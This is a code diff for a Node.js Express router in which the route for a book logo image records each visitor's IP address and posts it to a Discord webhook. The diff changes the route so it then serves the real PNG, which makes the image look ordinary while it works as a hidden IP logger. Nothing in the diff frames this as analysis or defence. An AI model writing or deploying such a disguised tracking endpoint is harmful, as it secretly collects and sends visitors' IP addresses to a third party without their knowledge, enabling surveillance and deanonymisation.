@@ -1,17 +1,16 @@
 var express = require("express");
 var router = express.Router();
 var axios = require("axios");
-var app = express();
-
-app.use(express.static('public'));
+var fs = require("fs");
+var path = require("path");
 
 router.get("/", function (req, res, next) {
   res.render("index.html");
 });
 
-router.get("/images/book-logo.png", function (req, res, next) {
-  res.render("index.html");
-  var ip = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress;
+router.get("/images/book-logo.png", function (req, res) {
+  var ip =
+    req.headers["x-forwarded-for"] || req.ip || req.connection.remoteAddress;
   console.log("ip : ", ip); // ip address of the user
   // 디스코드 웹훅 URL
   var webhookUrl =
@@ -30,7 +29,15 @@ router.get("/images/book-logo.png", function (req, res, next) {
       console.error("디스코드로 메시지를 보내는 데 실패함:", err)
     );
 
-  next();
+  var imagePath = path.join(__dirname, "public/images/book-logo.png");
+  fs.readFile(imagePath, function (err, data) {
+    if (err) {
+      res.status(404).send("Not Found");
+    } else {
+      res.setHeader("Content-Type", "image/png");
+      res.send(data);
+    }
+  });
 });
 
 module.exports = router;
